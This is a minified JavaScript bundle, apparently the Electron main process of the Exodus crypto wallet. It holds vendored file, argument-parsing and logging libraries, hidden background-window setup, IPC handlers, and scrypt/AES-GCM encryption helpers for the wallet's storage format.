						const e = i.get(n);
						if (!(s.get(n).reusable && e.isDestroyed())) return Object(o.a)("session reuse between WebContents", `: ${t}`, 1, !1), void l.add(n)
					}
				} else {
					if (i.has(n)) return Object(o.a)("session reuse without registration", "", 1), void l.add(n);
					setImmediate(() => {
						s.has(n) || (Object(o.a)("session that was not immediately registered", "", 1), l.add(n))
					})
				}
				i.set(n, e), f.set(e, t)
			}
		} else Object(o.a)("using default session for WebContents", "", 1)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(43),
		o = n(1),
		i = n(32);

	function s(e, t, n) {
		const o = n.dereference ? e => r.stat(e, {
			bigint: !0
		}) : e => r.lstat(e, {
			bigint: !0
		});
		return Promise.all([o(e), o(t).catch(e => {
			if ("ENOENT" === e.code) return null;
			throw e
		})]).then(([e, t]) => ({
			srcStat: e,
			destStat: t
		}))
	}

	function c(e, t) {
		return t.ino && t.dev && t.ino === e.ino && t.dev === e.dev
	}

	function a(e, t) {
		const n = o.resolve(e).split(o.sep).filter(e => e),
			r = o.resolve(t).split(o.sep).filter(e => e);
		return n.reduce((e, t, n) => e && r[n] === t, !0)
	}

	function u(e, t, n) {
		return `Cannot ${n} '${e}' to a subdirectory of itself, '${t}'.`
	}
	e.exports = {
		checkPaths: function(e, t, n, r, l) {
			i.callbackify(s)(e, t, r, (r, i) => {
				if (r) return l(r);
				const {
					srcStat: s,
					destStat: f
				} = i;
				if (f) {
					if (c(s, f)) {
						const r = o.basename(e),
							i = o.basename(t);
						return "move" === n && r !== i && r.toLowerCase() === i.toLowerCase() ? l(null, {
							srcStat: s,
							destStat: f,
							isChangingCase: !0
						}) : l(new Error("Source and destination must not be the same."))
					}
					if (s.isDirectory() && !f.isDirectory()) return l(new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`));
					if (!s.isDirectory() && f.isDirectory()) return l(new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`))
				}
				return s.isDirectory() && a(e, t) ? l(new Error(u(e, t, n))) : l(null, {
					srcStat: s,
					destStat: f
				})
			})
		},
		checkPathsSync: function(e, t, n, i) {
			const {
				srcStat: s,
				destStat: l
			} = function(e, t, n) {
				let o;
				const i = n.dereference ? e => r.statSync(e, {
						bigint: !0
					}) : e => r.lstatSync(e, {
						bigint: !0
					}),
					s = i(e);
				try {
					o = i(t)
				} catch (e) {
					if ("ENOENT" === e.code) return {
						srcStat: s,
						destStat: null
					};
					throw e
				}
				return {
					srcStat: s,
					destStat: o
				}
			}(e, t, i);
			if (l) {
				if (c(s, l)) {
					const r = o.basename(e),
						i = o.basename(t);
					if ("move" === n && r !== i && r.toLowerCase() === i.toLowerCase()) return {
						srcStat: s,
						destStat: l,
						isChangingCase: !0
					};
					throw new Error("Source and destination must not be the same.")
				}
				if (s.isDirectory() && !l.isDirectory()) throw new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`);
				if (!s.isDirectory() && l.isDirectory()) throw new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`)
			}
			if (s.isDirectory() && a(e, t)) throw new Error(u(e, t, n));
			return {
				srcStat: s,
				destStat: l
			}
		},
		checkParentPaths: function e(t, n, i, s, a) {
			const l = o.resolve(o.dirname(t)),
				f = o.resolve(o.dirname(i));
			if (f === l || f === o.parse(f).root) return a();
			r.stat(f, {
				bigint: !0
			}, (r, o) => r ? "ENOENT" === r.code ? a() : a(r) : c(n, o) ? a(new Error(u(t, i, s))) : e(t, n, f, s, a))
		},
		checkParentPathsSync: function e(t, n, i, s) {
			const a = o.resolve(o.dirname(t)),
				l = o.resolve(o.dirname(i));
			if (l === a || l === o.parse(l).root) return;
			let f;
			try {
				f = r.statSync(l, {
					bigint: !0
				})
			} catch (e) {
				if ("ENOENT" === e.code) return;
				throw e
			}
			if (c(n, f)) throw new Error(u(t, i, s));
			return e(t, n, l, s)
		},
		isSrcSubdir: a,
		areIdentical: c
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback,
		o = n(7),
		i = ["access", "appendFile", "chmod", "chown", "close", "copyFile", "fchmod", "fchown", "fdatasync", "fstat", "fsync", "ftruncate", "futimes", "lchmod", "lchown", "link", "lstat", "mkdir", "mkdtemp", "open", "opendir", "readdir", "readFile", "readlink", "realpath", "rename", "rm", "rmdir", "stat", "symlink", "truncate", "unlink", "utimes", "writeFile"].filter(e => "function" == typeof o[e]);
	Object.assign(t, o), i.forEach(e => {
		t[e] = r(o[e])
	}), t.exists = function(e, t) {
		return "function" == typeof t ? o.exists(e, t) : new Promise(t => o.exists(e, t))
	}, t.read = function(e, t, n, r, i, s) {
		return "function" == typeof s ? o.read(e, t, n, r, i, s) : new Promise((s, c) => {
			o.read(e, t, n, r, i, (e, t, n) => {
				if (e) return c(e);
				s({
					bytesRead: t,
					buffer: n
				})
			})
		})
	}, t.write = function(e, t, ...n) {
		return "function" == typeof n[n.length - 1] ? o.write(e, t, ...n) : new Promise((r, i) => {
			o.write(e, t, ...n, (e, t, n) => {
				if (e) return i(e);
				r({
					bytesWritten: t,
					buffer: n
				})
			})
		})
	}, "function" == typeof o.writev && (t.writev = function(e, t, ...n) {
		return "function" == typeof n[n.length - 1] ? o.writev(e, t, ...n) : new Promise((r, i) => {
			o.writev(e, t, ...n, (e, t, n) => {
				if (e) return i(e);
				r({
					bytesWritten: t,
					buffers: n
				})
			})
		})
	}), "function" == typeof o.realpath.native ? t.realpath.native = r(o.realpath.native) : process.emitWarning("fs.realpath.native is not a function. Is fs being monkey-patched?", "Warning", "fs-extra-WARN0003")
}, function(e, t) {
	var n, r;
	n = this, r = function() {
		return function() {
			var e = arguments;
			"object" == typeof arguments[0] && (e = arguments[0], arguments[1]);
			var t = [].slice.call(e, 0).join("/");
			return t.replace(/:\//g, "://").replace(/([^:\s])\/+/g, "$1/").replace(/\/(\?|&|#[^!])/g, "$1").replace(/(\?.+)\?/g, "$1&")
		}
	}, void 0 !== e && e.exports ? e.exports = r() : "function" == typeof define && define.amd ? define(r) : n.urljoin = r()
}, function(e, t) {
	function n(e) {
		return "number" == typeof e || (!!/^0x[0-9a-f]+$/i.test(e) || /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(e[-+]?\d+)?$/.test(e))
	}

	function r(e, t) {
		return "constructor" === t && "function" == typeof e[t] || "__proto__" === t
	}
	e.exports = function(e, t) {
		t || (t = {});
		var o = {
			bools: {},
			strings: {},
			unknownFn: null
		};
		"function" == typeof t.unknown && (o.unknownFn = t.unknown), "boolean" == typeof t.boolean && t.boolean ? o.allBools = !0 : [].concat(t.boolean).filter(Boolean).forEach(function(e) {
			o.bools[e] = !0
		});
		var i = {};
		Object.keys(t.alias || {}).forEach(function(e) {
			i[e] = [].concat(t.alias[e]), i[e].forEach(function(t) {
				i[t] = [e].concat(i[e].filter(function(e) {
					return t !== e
				}))
			})
		}), [].concat(t.string).filter(Boolean).forEach(function(e) {
			o.strings[e] = !0, i[e] && (o.strings[i[e]] = !0)
		});
		var s = t.default || {},
			c = {
				_: []
			};
		Object.keys(o.bools).forEach(function(e) {
			u(e, void 0 !== s[e] && s[e])
		});
		var a = [];

		function u(e, t, r) {
			if (!r || !o.unknownFn || function(e, t) {
					return o.allBools && /^--[^=]+$/.test(t) || o.strings[e] || o.bools[e] || i[e]
				}(e, r) || !1 !== o.unknownFn(r)) {
				var s = !o.strings[e] && n(t) ? Number(t) : t;
				l(c, e.split("."), s), (i[e] || []).forEach(function(e) {
					l(c, e.split("."), s)
				})
			}
		}

		function l(e, t, n) {
			for (var i = e, s = 0; s < t.length - 1; s++) {
				if (r(i, c = t[s])) return;
				void 0 === i[c] && (i[c] = {}), i[c] !== Object.prototype && i[c] !== Number.prototype && i[c] !== String.prototype || (i[c] = {}), i[c] === Array.prototype && (i[c] = []), i = i[c]
			}
			var c;
			r(i, c = t[t.length - 1]) || (i !== Object.prototype && i !== Number.prototype && i !== String.prototype || (i = {}), i === Array.prototype && (i = []), void 0 === i[c] || o.bools[c] || "boolean" == typeof i[c] ? i[c] = n : Array.isArray(i[c]) ? i[c].push(n) : i[c] = [i[c], n])
		}

		function f(e) {
			return i[e].some(function(e) {
				return o.bools[e]
			})
		} - 1 !== e.indexOf("--") && (a = e.slice(e.indexOf("--") + 1), e = e.slice(0, e.indexOf("--")));
		for (var d = 0; d < e.length; d++) {
			var p = e[d];
			if (/^--.+=/.test(p)) {
				var h = p.match(/^--([^=]+)=([\s\S]*)$/),
					y = h[1],
					m = h[2];
				o.bools[y] && (m = "false" !== m), u(y, m, p)
			} else if (/^--no-.+/.test(p)) {
				u(y = p.match(/^--no-(.+)/)[1], !1, p)
			} else if (/^--.+/.test(p)) {
				y = p.match(/^--(.+)/)[1];
				void 0 === (v = e[d + 1]) || /^-/.test(v) || o.bools[y] || o.allBools || i[y] && f(y) ? /^(true|false)$/.test(v) ? (u(y, "true" === v, p), d++) : u(y, !o.strings[y] || "", p) : (u(y, v, p), d++)
			} else if (/^-[^-]+/.test(p)) {
				for (var w = p.slice(1, -1).split(""), b = !1, g = 0; g < w.length; g++) {
					var v;
					if ("-" !== (v = p.slice(g + 2))) {
						if (/[A-Za-z]/.test(w[g]) && /=/.test(v)) {
							u(w[g], v.split("=")[1], p), b = !0;
							break
						}
						if (/[A-Za-z]/.test(w[g]) && /-?\d+(\.\d*)?(e-?\d+)?$/.test(v)) {
							u(w[g], v, p), b = !0;
							break
						}
						if (w[g + 1] && w[g + 1].match(/\W/)) {
							u(w[g], p.slice(g + 2), p), b = !0;
							break
						}
						u(w[g], !o.strings[w[g]] || "", p)
					} else u(w[g], v, p)
				}
				y = p.slice(-1)[0];
				b || "-" === y || (!e[d + 1] || /^(-|--)[^-]/.test(e[d + 1]) || o.bools[y] || i[y] && f(y) ? e[d + 1] && /^(true|false)$/.test(e[d + 1]) ? (u(y, "true" === e[d + 1], p), d++) : u(y, !o.strings[y] || "", p) : (u(y, e[d + 1], p), d++))
			} else if (o.unknownFn && !1 === o.unknownFn(p) || c._.push(o.strings._ || !n(p) ? p : Number(p)), t.stopEarly) {
				c._.push.apply(c._, e.slice(d + 1));
				break
			}
		}
		return Object.keys(s).forEach(function(e) {
			var t, n, r;
			t = c, n = e.split("."), r = t, n.slice(0, -1).forEach(function(e) {
				r = r[e] || {}
			}), n[n.length - 1] in r || (l(c, e.split("."), s[e]), (i[e] || []).forEach(function(t) {
				l(c, t.split("."), s[e])
			}))
		}), t["--"] ? (c["--"] = new Array, a.forEach(function(e) {
			c["--"].push(e)
		})) : a.forEach(function(e) {
			c._.push(e)
		}), c
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "b", function() {
		return a
	}), n.d(t, "a", function() {
		return u
	});
	var r = n(0),
		o = n(2),
		i = n(21),
		s = n.n(i);
	const c = [o.o];

	function a() {
		s.a.beginEvent("setDefaultProtocols"), c.forEach(e => r.app.setAsDefaultProtocolClient(e, process.execPath, ["--"])), s.a.endEvent("setDefaultProtocols")
	}

	function u() {
		c.forEach(e => r.app.removeAsDefaultProtocolClient(e, process.execPath, ["--"]))
	}
}, function(e, t) {
	var n = 1e3,
		r = 60 * n,
		o = 60 * r,
		i = 24 * o,
		s = 365.25 * i;

	function c(e, t, n) {
		if (!(e < t)) return e < 1.5 * t ? Math.floor(e / t) + " " + n : Math.ceil(e / t) + " " + n + "s"
	}
	e.exports = function(e, t) {
		t = t || {};
		var a, u = typeof e;
		if ("string" === u && e.length > 0) return function(e) {
			if ((e = String(e)).length > 1e4) return;
			var t = /^((?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|years?|yrs?|y)?$/i.exec(e);
			if (!t) return;
			var c = parseFloat(t[1]);
			switch ((t[2] || "ms").toLowerCase()) {
				case "years":
				case "year":
				case "yrs":
				case "yr":
				case "y":
					return c * s;
				case "days":
				case "day":
				case "d":
					return c * i;
				case "hours":
				case "hour":
				case "hrs":
				case "hr":
				case "h":
					return c * o;
				case "minutes":
				case "minute":
				case "mins":
				case "min":
				case "m":
					return c * r;
				case "seconds":
				case "second":
				case "secs":
				case "sec":
				case "s":
					return c * n;
				case "milliseconds":
				case "millisecond":
				case "msecs":
				case "msec":
				case "ms":
					return c;
				default:
					return
			}
		}(e);
		if ("number" === u && !1 === isNaN(e)) return t.long ? c(a = e, i, "day") || c(a, o, "hour") || c(a, r, "minute") || c(a, n, "second") || a + " ms" : function(e) {
			if (e >= i) return Math.round(e / i) + "d";
			if (e >= o) return Math.round(e / o) + "h";
			if (e >= r) return Math.round(e / r) + "m";
			if (e >= n) return Math.round(e / n) + "s";
			return e + "ms"
		}(e);
		throw new Error("val is not a non-empty string or a valid number. val=" + JSON.stringify(e))
	}
}, function(e, t, n) {
	"use strict";
	e.exports = t = n(123);
	var r = n(122);
	t.Byte = r.Byte, t.Int8 = r.Int8, t.UInt8 = r.UInt8, t.Int16BE = r.Int16BE, t.Int16LE = r.Int16LE, t.UInt16BE = r.UInt16BE, t.UInt16LE = r.UInt16LE, t.Int32BE = r.Int32BE, t.Int32LE = r.Int32LE, t.UInt32BE = r.UInt32BE, t.UInt32LE = r.UInt32LE, t.Int64BE = r.Int64BE, t.Int64LE = r.Int64LE, t.UInt64BE = r.UInt64BE, t.UInt64LE = r.UInt64LE, t.FloatBE = r.FloatBE, t.FloatLE = r.FloatLE, t.DoubleBE = r.DoubleBE, t.DoubleLE = r.DoubleLE, t.Array = n(120), t.VarArray = n(119), t.Sequence = n(118), t.Buffer = n(73), t.VarBuffer = n(72), t.String = n(117), t.VarString = n(116), t.Bound = n(115)
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(140);
	e.exports = {
		remove: r(o),
		removeSync: o.sync
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(17).fromCallback,
		i = n(171);
	e.exports = {
		remove: o(function(e, t) {
			if (r.rm) return r.rm(e, {
				recursive: !0,
				force: !0
			}, t);
			i(e, t)
		}),
		removeSync: function(e) {
			if (r.rmSync) return r.rmSync(e, {
				recursive: !0,
				force: !0
			});
			i.sync(e)
		}
	}
}, function(e, t) {
	e.exports = require("stream")
}, function(e, t) {
	e.exports = require("module")
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return f
	}), n.d(t, "b", function() {
		return d
	});
	var r = n(0),
		o = n(8),
		i = n(11),
		s = n(14),
		c = n(5),
		a = n(10);
	const u = {
		...a.a,
		backgroundColor: "#fff",
		x: 0,
		y: 0,
		fullscreen: !1,
		fullscreenable: !1,
		maximizable: !1,
		minimizable: !1,
		resizable: !0,
		show: !1,
		skipTaskbar: !1,
		title: "Network Process (hidden window)",
		webPreferences: {
			...a.c,
			partition: "persist:network",
			backgroundThrottling: !1
		}
	};
	let l = null;
	const f = () => l;

	function d() {
		const e = r.screen.getPrimaryDisplay().size,
			t = {
				...u,
				width: e.width / 3,
				height: e.height / 2
			};
		l = new r.BrowserWindow(t), Object(o.registerWebContents)(l.webContents, "network"), Object(s.a)(l.webContents, "network"), l.loadFile(c.f), Object(i.a)({
			windowHandle: l.webContents,
			windowId: "network"
		}), l.webContents.on("will-navigate", e => {
			e.preventDefault()
		});
		let n = !1;
		return r.app.on("before-quit", () => {
			n = !0, l.isDestroyed() || l.close()
		}), l.on("close", function(e) {
			n || (e.preventDefault(), l.hide())
		}), l
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return f
	}), n.d(t, "b", function() {
		return d
	});
	var r = n(0),
		o = n(8),
		i = n(11),
		s = n(14),
		c = n(5),
		a = n(10);
	const u = {
		...a.a,
		x: 0,
		y: 0,
		backgroundColor: "#fff",
		width: 1120,
		height: 980,
		minWidth: 300,
		minHeight: 400,
		show: !1,
		title: "Monero Process (hidden window)",
		webPreferences: {
			...a.b,
			partition: "persist:monero",
			backgroundThrottling: !1
		}
	};
	let l = null;
	const f = () => l;

	function d(e) {
		const t = r.screen.getPrimaryDisplay().size,
			n = {
				...u,
				width: t.width / 3,
				height: t.height / 2
			};
		l = new r.BrowserWindow(n), Object(o.registerWebContents)(l.webContents, "monero"), Object(s.a)(l.webContents, "monero"), l.loadFile(c.e), Object(i.a)({
			windowHandle: l.webContents,
			windowId: "monero"
		});
		let a = !1;
		return r.app.on("before-quit", () => {
			a = !0, l.isDestroyed() || l.close()
		}), l.on("close", function(e) {
			a || (e.preventDefault(), l.hide())
		}), l
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return m
	}), n.d(t, "b", function() {
		return w
	});
	var r = n(85),
		o = n(0),
		i = n(27),
		s = n.n(i),
		c = n(30),
		a = n(34),
		u = n(5),
		l = n(8),
		f = n(11),
		d = n(14),
		p = n(10);
	const h = {
		...p.a,
		backgroundColor: "#fff",
		x: 0,
		y: 0,
		fullscreen: !1,
		fullscreenable: !1,
		maximizable: !1,
		minimizable: !1,
		resizable: !0,
		show: !1,
		skipTaskbar: !1,
		title: "Core process (hidden window)",
		webPreferences: {
			...p.b,
			partition: "core",
			backgroundThrottling: !1
		}
	};
	let y = null;
	const m = () => y;

	function w() {
		const e = o.screen.getPrimaryDisplay().size,
			t = {
				...h,
				width: e.width / 3,
				height: e.height / 2
			};
		y = new o.BrowserWindow(t), Object(l.registerWebContents)(y.webContents, "core"), Object(d.a)(y.webContents, "core"), y.loadFile(u.b), Object(f.a)({
			windowHandle: y.webContents,
			windowId: "core"
		}), y.webContents.on("will-navigate", e => {
			e.preventDefault()
		});
		let n = !1;
		return o.app.on("before-quit", e => {
			const t = Object(c.b)(Object(a.d)()),
				i = `${t.infoFile}.lock`,
				u = s.a.existsSync(i),
				l = Object(r.isStorageWriting)(t.storageFile);
			u || l ? (u && console.log(`${i} exists.`), l && console.log("storage.seco is still writing"), e.preventDefault(), setTimeout(() => o.app.quit(), 2e3)) : (n = !0, y.isDestroyed() || y.close())
		}), y.on("close", function(e) {
			n || (e.preventDefault(), y.hide())
		}), y
	}
}, function(e, t) {
	e.exports = require("child_process")
}, function(e, t, n) {
	e.exports = n(51)
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.vsf = function e(t) {
		return t.map(t => ({
			name: t[0],
			type: Array.isArray(t[1]) ? (0, i.default)(e(t[1])) : t[1]
		}))
	}, t.CStr = function(e, t = "utf8") {
		let n = (0, o.Buffer)(e);

		function r(r, o, i) {
			let s = Buffer.alloc(e);
			return s.write(r, t), n.encode(s, o, i)
		}

		function i(e, r, o) {
			let i = n.decode(e, r, o),
				s = 0;
			for (; s < i.length && 0 !== i[s]; s++);
			return i.slice(0, s).toString(t)
		}
		return r.bytes = i.bytes = e, {
			encode: r,
			decode: i,
			encodingLength: () => e
		}
	};
	var r, o = n(48),
		i = (r = o) && r.__esModule ? r : {
			default: r
		}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.IV_LEN_BYTES = void 0;
	var r = Object.assign || function(e) {
		for (var t = 1; t < arguments.length; t++) {
			var n = arguments[t];
			for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
		}
		return e
	};
	t.createScryptParams = a, t.stretchPassphrase = u, t.aesEncrypt = l, t.aesDecrypt = f, t.boxEncrypt = function(e, t, n) {
		const {
			key: r,
			salt: o
		} = u(e, n), {
			authTag: i,
			blob: s,
			iv: c
		} = l(r, t);
		return {
			authTag: i,
			blob: s,
			iv: c,
			salt: o
		}
	}, t.boxDecrypt = function(e, t, {
		iv: n,
		authTag: o
	}, i) {
		i = r({}, a(), i);
		const {
			key: s
		} = u(e, i);
		return f(s, t, {
			iv: n,
			authTag: o
		})
	}, t.sha256 = function(e) {
		return o.default.createHash("sha256").update(e).digest()
	};
	var o = s(n(28)),
		i = s(n(124));

	function s(e) {
		return e && e.__esModule ? e : {
			default: e
		}
	}
	const c = t.IV_LEN_BYTES = 12;

	function a(e = {}) {
		return r({
			salt: o.default.randomBytes(32),
			n: 16384,
			r: 8,
			p: 1
		}, e)
	}

	function u(e, {
		salt: t,
		n: n,
		r: r,
		p: o
	} = a()) {
		return {
			key: (0, i.default)(e, t, n, r, o, 32),
			salt: t
		}
	}

	function l(e, t, n = {
		cipher: "aes-256-gcm",
		iv: o.default.randomBytes(c)
	}) {
		const r = o.default.createCipheriv(n.cipher, e, n.iv),
			i = Buffer.concat([r.update(t), r.final()]);
		return {
			authTag: r.getAuthTag(),
			blob: i,
			iv: n.iv
		}
	}

	function f(e, t, {
		cipher: n = "aes-256-gcm",
		iv: r,
		authTag: i
	} = {}) {
		const s = o.default.createDecipheriv(n, e, r);
		return s.setAuthTag(i), Buffer.concat([s.update(t), s.final()])
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(138);
	e.exports = {
		readJson: r(o.readFile),
		readJsonSync: o.readFileSync,
		writeJson: r(o.writeFile),
		writeJsonSync: o.writeFileSync
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback,
		o = n(7),
		i = n(1),
		s = n(22),
		c = n(36).pathExists;
	e.exports = {
		outputFile: r(function(e, t, n, r) {
			"function" == typeof n && (r = n, n = "utf8");
			const a = i.dirname(e);
			c(a, (i, c) => i ? r(i) : c ? o.writeFile(e, t, n, r) : void s.mkdirs(a, i => {
				if (i) return r(i);
				o.writeFile(e, t, n, r)
			}))
		}),
		outputFileSync: function(e, ...t) {
			const n = i.dirname(e);
			if (o.existsSync(n)) return o.writeFileSync(e, ...t);
			s.mkdirsSync(n), o.writeFileSync(e, ...t)
		}
	}
}, function(e, t) {
	e.exports = {
		stringify: function(e, {
			EOL: t = "\n",
			finalEOL: n = !0,
			replacer: r = null,
			spaces: o
		} = {}) {
			const i = n ? t : "";
			return JSON.stringify(e, r, o).replace(/\n/g, t) + i
		},
		stripBom: function(e) {
			return Buffer.isBuffer(e) && (e = e.toString("utf8")), e.replace(/^\uFEFF/, "")
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback;
	e.exports = {
		copy: r(n(176)),
		copySync: n(173)
	}
}, function(e, t) {
	e.exports = require("assert")
}, function(e, t) {
	e.exports = require("zlib")
}, function(e) {
	e.exports = {
		name: "exodus",
		productName: "Exodus",
		version: "23.4.24",
		description: "Secure, manage, and trade blockchain assets."
	}
}, function(e, t, n) {
	const {
		app: r,
		BrowserWindow: o,
		screen: i,
		desktopCapturer: s
	} = n(0), c = n(33), {
		browserViewFromWebContents: a,
		browserWindowFromBrowserView: u
	} = n(15), l = {
		on: new Map,
		handle: new Map
	};
	l.on.set("app:exit", (e, t) => {
		r.exit(t)
	}), l.on.set("app:quit", () => {
		r.quit()
	}), l.on.set("app:relaunch", (e, {
		addArgs: t
	} = {}) => {
		t ? r.relaunch({
			args: process.argv.slice(1).concat(t)
		}) : r.relaunch(), e.returnValue = 0
	}), l.on.set("app:meta", e => {
		e.returnValue = {
			DEBUG_MODE: globalThis.DEBUG_MODE
		}
	}), l.on.set("app:path", (e, t) => {
		if ("app" === t) e.returnValue = r.getAppPath();
		else {
			if (!["desktop", "userData"].includes(t)) throw e.returnValue = void 0, new Error(`Unsupported type: ${t}`);
			e.returnValue = r.getPath(t)
		}
	}), l.on.set("app:os:cpus", e => {
		e.returnValue = c.cpus().length
	}), l.handle.set("app:os:info", () => ({
		arch: c.arch(),
		platform: c.platform(),
		type: c.type(),
		release: c.release(),
		freemem: c.freemem(),
		totalmem: c.totalmem(),
		cpus: c.cpus().length
	}));
	const f = e => {
		const t = o.fromWebContents(e);
		if (t) return t;
		const n = a(e);
		return n ? u(n) : void 0
	};
	l.on.set("sender:position:get", (e, t = {}) => {
		const n = f(e.sender);
		e.returnValue = n ? n.getPosition() : void 0
	}), l.on.set("sender:size:get", (e, t = {}) => {
		const n = f(e.sender);
		e.returnValue = n ? n.getSize() : void 0
	}), l.on.set("sender:sheetOffset:set", (e, ...t) => {
		const n = f(e.sender);
		n && n.setSheetOffset(...t), e.returnValue = n ? 0 : 1
	}), l.on.set("sender:close", (e, t = {}) => {
		f(e.sender).close(), e.returnValue = void 0
	}), l.handle.set("screen:display:all", () => i.getAllDisplays()), l.handle.set("screen:display:current", e => {
		const t = f(e.sender);
		if (!t) return;
		const [n, r] = t.getPosition();
		return i.getDisplayNearestPoint({
			x: n,
			y: r
		})
	}), l.handle.set("screen:capturer:sources", async () => {
		const e = await s.getSources({
			types: ["screen"]
		});
		return JSON.parse(JSON.stringify(e))
	}), e.exports = l
}, function(e, t, n) {
	"use strict";
	var r = n(1),
		o = n(0),
		i = n(154),
		s = n(153),
		c = n(152);
	e.exports = function(e) {
		var t, n, a, u = o.app,
			l = o.screen,
			f = 100,
			d = Object.assign({
				file: "window-state.json",
				path: u.getPath("userData"),
				maximize: !0,
				fullScreen: !0
			}, e),
			p = r.join(d.path, d.file);

		function h() {
			return t && Number.isInteger(t.x) && Number.isInteger(t.y) && Number.isInteger(t.width) && Number.isInteger(t.height)
		}

		function y(e) {
			if (e = e || n) {
				var r = e.getBounds();
				(function(e) {
					return !e.isMaximized() && !e.isMinimized() && !e.isFullScreen()
				})(e) && (t.x = r.x, t.y = r.y, t.width = r.width, t.height = r.height), t.isMaximized = e.isMaximized(), t.isFullScreen = e.isFullScreen(), t.displayBounds = l.getDisplayMatching(r).bounds
			}
		}

		function m(e) {
			e && y(e);
			try {
				s.sync(r.dirname(p)), i.writeFileSync(p, t)
			} catch (e) {}
		}

		function w() {
			clearTimeout(a), a = setTimeout(y, f)
		}

		function b() {
			y()
		}

		function g() {
			v(), m()
		}

		function v() {
			n && (n.removeListener("resize", w), n.removeListener("move", w), clearTimeout(a), n.removeListener("close", b), n.removeListener("closed", g), n = null)
		}
		try {
			t = i.readFileSync(p)
		} catch (e) {}
		return function() {
			if (t && (h() || t.isMaximized || t.isFullScreen)) {
				if (h() && t.displayBounds) {
					var e = l.getDisplayMatching(t).bounds;
					c(t.displayBounds, e, {
						strict: !0
					}) || (e.width < t.displayBounds.width && (t.x > e.width && (t.x = 0), t.width > e.width && (t.width = e.width)), e.height < t.displayBounds.height && (t.y > e.height && (t.y = 0), t.height > e.height && (t.height = e.height)))
				}
			} else t = null
		}(), t = Object.assign({
			width: d.defaultWidth || 800,
			height: d.defaultHeight || 600
		}, t), {
			get x() {
				return t.x
			},
			get y() {
				return t.y
			},
			get width() {
				return t.width
			},
			get height() {
				return t.height
			},
			get isMaximized() {
				return t.isMaximized
			},
			get isFullScreen() {
				return t.isFullScreen
			},
			saveState: m,
			unmanage: v,
			manage: function(e) {
				d.maximize && t.isMaximized && e.maximize(), d.fullScreen && t.isFullScreen && e.setFullScreen(!0), e.on("resize", w), e.on("move", w), e.on("close", b), e.on("closed", g), n = e
			}
		}
	}
}, function(e, t, n) {
	e.exports = function(e) {
		function t(e) {
			let n, o = null;

			function i(...e) {
				if (!i.enabled) return;
				const r = i,
					o = Number(new Date),
					s = o - (n || o);
				r.diff = s, r.prev = n, r.curr = o, n = o, e[0] = t.coerce(e[0]), "string" != typeof e[0] && e.unshift("%O");
				let c = 0;
				e[0] = e[0].replace(/%([a-zA-Z%])/g, (n, o) => {
					if ("%%" === n) return "%";
					c++;
					const i = t.formatters[o];
					if ("function" == typeof i) {
						const t = e[c];
						n = i.call(r, t), e.splice(c, 1), c--
					}
					return n
				}), t.formatArgs.call(r, e), (r.log || t.log).apply(r, e)
			}
			return i.namespace = e, i.useColors = t.useColors(), i.color = t.selectColor(e), i.extend = r, i.destroy = t.destroy, Object.defineProperty(i, "enabled", {
				enumerable: !0,
				configurable: !1,
				get: () => null === o ? t.enabled(e) : o,
				set: e => {
					o = e
				}
			}), "function" == typeof t.init && t.init(i), i
		}

		function r(e, n) {
			const r = t(this.namespace + (void 0 === n ? ":" : n) + e);
			return r.log = this.log, r
		}

		function o(e) {
			return e.toString().substring(2, e.toString().length - 2).replace(/\.\*\?$/, "*")
		}
		return t.debug = t, t.default = t, t.coerce = function(e) {
			return e instanceof Error ? e.stack || e.message : e
		}, t.disable = function() {
			const e = [...t.names.map(o), ...t.skips.map(o).map(e => "-" + e)].join(",");
			return t.enable(""), e
		}, t.enable = function(e) {
			let n;
			t.save(e), t.names = [], t.skips = [];
			const r = ("string" == typeof e ? e : "").split(/[\s,]+/),
				o = r.length;
			for (n = 0; n < o; n++) r[n] && ("-" === (e = r[n].replace(/\*/g, ".*?"))[0] ? t.skips.push(new RegExp("^" + e.substr(1) + "$")) : t.names.push(new RegExp("^" + e + "$")))
		}, t.enabled = function(e) {
			if ("*" === e[e.length - 1]) return !0;
			let n, r;
			for (n = 0, r = t.skips.length; n < r; n++)
				if (t.skips[n].test(e)) return !1;
			for (n = 0, r = t.names.length; n < r; n++)
				if (t.names[n].test(e)) return !0;
			return !1
		}, t.humanize = n(95), t.destroy = function() {
			console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")
		}, Object.keys(e).forEach(n => {
			t[n] = e[n]
		}), t.names = [], t.skips = [], t.formatters = {}, t.selectColor = function(e) {
			let n = 0;
			for (let t = 0; t < e.length; t++) n = (n << 5) - n + e.charCodeAt(t), n |= 0;
			return t.colors[Math.abs(n) % t.colors.length]
		}, t.enable(t.load()), t
	}
}, function(e, t) {
	e.exports.getLockFile = (e => `${e}.lock`)
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.struct = t.METADATA_LEN_BYTES = void 0, t.decode = function(e) {
		e.byteLength > a && console.warn("metadata greater than `${METADATA_LEN_BYTES}` bytes, are you sure this is the SECO metadata?");
		return u.decode(e)
	}, t.encode = l, t.serialize = function(e) {
		let t = Buffer.alloc(a);
		return l(e).copy(t), t
	}, t.create = function(e = (0, s.createScryptParams)()) {
		return {
			scrypt: e,
